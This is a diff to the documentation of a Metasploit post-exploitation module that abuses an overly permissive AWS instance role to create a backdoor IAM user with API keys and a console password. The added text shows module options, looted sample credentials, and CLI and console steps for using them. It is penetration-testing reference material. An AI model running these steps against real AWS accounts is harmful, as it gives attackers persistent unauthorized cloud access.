@@ -113,6 +113,11 @@ Active sessions
 
 ## Options
 
+By default the module will:
+
+* create a randomly named IAM user and group
+* generate API Keys and User password for after  
+
 In the event that the session'd AWS instance does not have an IAM role assigned
 to it with sufficient privileges, the following options can be used to provide
 specific authentication material:
@@ -127,6 +132,25 @@ The following options control the account that is being created:
 * `CREATE_API`: when true, creates API keys for this user
 * `CREATE_CONSOLE`: when true, creates a password for this user so that they can access the AWS console
 
+```
+msf exploit(sshexec) > use post/multi/escalate/aws_create_iam_user
+msf post(aws_create_iam_user) > show options
+
+Module options (post/multi/escalate/aws_create_iam_user):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   AccessKeyId                       no        AWS access key
+   CREATE_API       true             yes       Add access key ID and secret access key to account (API, CLI, and SDK access)
+   CREATE_CONSOLE   true             yes       Create an account with a password for accessing the AWS management console
+   IAM_GROUPNAME                     no        Name of the group to be created (leave empty or unset to use a random name)
+   IAM_USERNAME                      no        Name of the user to be created (leave empty or unset to use a random name)
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   SESSION          1                yes       The session to run this module on.
+   SecretAccessKey                   no        AWS secret key
+   Token                             no        AWS session token
+
+```
 
 ## Abusing an Overly Permissive Instance Profile
 
@@ -136,7 +160,6 @@ overly permissive access. Once a session is established, we can load
 e.g., `SESSION 1` and run the exploit.
 
 ```
-msf exploit(sshexec) > use auxiliary/admin/aws/aws_create_iam_user
 msf post(aws_create_iam_user) > set SESSION 1
 SESSION => 1
 msf post(aws_create_iam_user) > exploit
@@ -221,6 +244,7 @@ bZWsmzyupDWxe8CT  bZWsmzyupDWxe8CT  74FXOTagsYCzxz0pjPOmnsASewj4Dq/JzH3Q24qj  AK
 Information necessary to use the created account is printed to the screen and stored in loot:
 
 ```
+$ cat ~/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
 {
   "UserName": "As56ekIV59OgoFOj",
   "GroupName": "As56ekIV59OgoFOj",
@@ -228,5 +252,31 @@ Information necessary to use the created account is printed to the screen and st
   "AccessKeyId": "AKIAIVNMYXYBXYE7VCHQ",
   "Password": "As56ekIV59OgoFOj",
   "AccountId": "xxx"
+```
+
+These creds can be used to call the AWS API directly or you can login using the console.
+
+Configuring the CLI:
+
+```
+$ aws configure --profile test
+AWS Access Key ID [None]: AKIA...
+AWS Secret Access Key [None]: THE SECRET ACCESS KEY...
+Default region name [None]: us-west-2
+Default output format [None]: json
+```
+
+Call the API, e.g., get the Account ID:
+
+```
+$ aws iam --profile test list-account-aliases
+{
+    "AccountAliases": [
+        "Account_ID"
+    ]
 }
 ```
+
+Login via the console using the username and password:
+
+Go to the AWS Console at https://Account_ID.signin.aws.amazon.com/console/ and login.
